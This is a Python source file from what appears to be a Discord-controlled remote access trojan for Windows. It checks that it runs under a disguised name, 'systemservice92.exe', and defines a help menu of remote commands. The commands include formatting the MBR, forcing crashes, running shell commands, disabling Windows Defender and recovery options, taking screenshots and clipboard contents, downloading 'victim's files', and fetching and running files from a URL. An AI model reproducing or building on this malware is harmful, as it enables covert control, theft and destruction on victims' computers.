import sys, os, discord
from discord import Embed
from win10toast import ToastNotifier

def nodubs():
    if os.path.basename(sys.executable).lower() != 'systemservice92.exe':
        sys.exit()

async def helpcommand(ctx):
    prefix = await ctx.bot.get_prefix(ctx.message)

    embed = discord.Embed(
        title="Command Guide",
        description=f"Use `{prefix}help` anytime to see this list. Commands are grouped for easier navigation.",
        color=discord.Color.dark_gray()
    )

    embed.add_field(
        name="DESTRUCTIVE",
        value=(
            "```"
            ".endpc >> uninstall windows and format mbr\n"
            ".crashpc >> floods the ram of the pc, instantly crashing it\n"
            ".bsod >> trigger a bluescreen crash"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="SYSTEM-CONTROL",
        value=(
            "```"
            ".cmd >> run shell commands\n"
            ".reload >> restart the bot\n"
            ".lp >> list running processes\n"
            ".pc >> pc control commands\n"
            ".sysinfo >> show system information\n"
            ".taskbar >> hide/show the taskbar\n"
            ".startupapps >> list all startup apps\n"
            ".kp <process> >> kill a process\n"
            ".defender >> toggle windows defender. usage is .defender on/off\n"
            ".reagentc >> toggle recovery options. usage is .reagentc on/off\n"
            ".sites >> sites manager. usage is .sites block/unblock site.com\n"
            ".user >> manage user accounts"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="ADMIN",
        value=(
            "```"
            ".admin >> run as admin\n"
            ".tm enable/disable >> enable/disable task manager\n"
            ".alert >> show a custom alert message"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="VISUAL-ELEMENT-MANAGEMENT",
        value=(
            "```"
            ".setvol >> set system volume\n"
            ".mouse >> mouse control commands\n"
            ".rotate >> rotate the screen\n"
            ".ss >> take a screenshot\n"
            ".cb >> clipboard management\n"
            ".wallpaper >> change desktop wallpaper\n"
            ".invcol >> invert screen colors"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="FILE-MANAGEMENT",
        value=(
            "```"
            ".getfiles >> download victim's files\n"
            ".ezip >> upload and extract files\n"
            ".linkshare >> download and run a file from a URL\n"
            ".cd >> navigate directories\n"
            ".share >> upload and run a file"
            "```"
        ),
        inline=False
    )

    embed.add_field(
        name="MISC",
        value=(
            "```"
            ".speak >> make the pc talk\n"
            ".deskflood >> flood desktop with images\n"
            ".clean >> clean all channels\n"
            ".clear >> clear the channel of all messages\n"
            ".sharenote >> open custom text in notepad"
            "```"
        ),
        inline=False
    )
    embed.add_field(
        name="BROWSER",
        value=(
            "```"
           ".search >> search in the browser\n"
           ".openurl >> open a URL in the browser"
          "```"
    ),
        inline=False
    )
    await ctx.send(embed=embed)